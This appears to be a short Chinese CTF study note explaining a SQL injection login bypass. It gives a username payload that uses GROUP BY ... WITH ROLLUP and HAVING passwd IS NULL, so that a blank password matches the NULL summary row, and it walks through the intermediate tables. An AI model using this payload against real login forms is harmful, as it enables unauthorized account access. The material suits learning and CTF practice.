tags:: [[CTF/SQL]]

- # 登陆
	- username填`' or 1 group by passwd with rollup having passwd is NULL#`，密码不填
	- 原理
		- 原表格
			- |username|passwd|
			  |---|---|
			  |xxx|yyy|
		- `group by passwd`根据密码分组
			- |username|passwd|
			  |---|---|
			  |xxx|yyy|
		- `with rollup`创建“总计”行，其中passwd为NULL
			- |username|passwd|
			  |---|---|
			  |xxx|yyy|
			  |xxx|NULL|
		- `having passwd is NULL`选中“总计”行
			- |username|passwd|
			  |---|---|
			  |xxx|NULL|
	-